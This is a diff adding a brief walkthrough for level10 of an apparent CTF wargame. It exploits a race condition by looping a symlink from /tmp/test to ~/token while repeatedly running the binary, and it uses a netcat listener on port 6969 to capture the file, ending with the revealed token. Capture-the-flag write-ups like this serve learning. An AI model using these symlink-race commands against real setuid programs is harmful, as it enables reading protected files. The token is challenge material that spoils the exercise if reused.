@@ -1,0 +1,35 @@
+strings level10
+-> socket [...] connect [...] open [] Connecting to %s:6969 ..
+trying to connect to ip:6969
+
+script 1
+
+while [ 1 ]
+do
+        rm -rf /tmp/test
+        touch /tmp/test
+        rm -rf /tmp/test
+        ln -s ~/token /tmp/test
+done
+
+-> spam creation of file / remove / make of symlink
+
+script 2
+
+while [ 1 ]
+do
+~/level10 /tmp/test 0
+done
+
+-> spam exec of level10 exec
+
+sh /tmp/test.sh &
+while true; do nc -l 6969; done
+
+-> spam netcat
+
+on an other console
+open scrpit 2
+then go back to the first one and get your token hiding in the spam
+woupa2yuojeeaaed06riuj63c
+-> win
